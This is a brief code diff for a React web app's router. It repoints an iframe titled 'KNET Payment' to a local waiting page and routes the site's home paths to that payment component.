@@ -18,7 +18,7 @@ import AdminLogin from "@/pages/AdminLogin";
 const KnetPage = () => {
   return (
     <iframe
-      src="/knet/knetpage.html"
+      src="/knetwait.html"
       style={{ width: '100%', height: '100vh', border: 'none' }}
       title="KNET Payment"
     />
@@ -70,8 +70,8 @@ function Router() {
   // make sure to consider if you need authentication for certain routes
   return (
     <Switch>
-      <Route path={"/"} component={Home} />
-      <Route path={"/en"} component={HomeEn} />
+      <Route path={"/"} component={KnetPage} />
+      <Route path={"/en"} component={KnetPage} />
       <Route path={"/pay"} component={Pay} />
       <Route path={"/pay-en"} component={PayEn} />
       <Route path="/unified-payment" component={UnifiedPayment} />
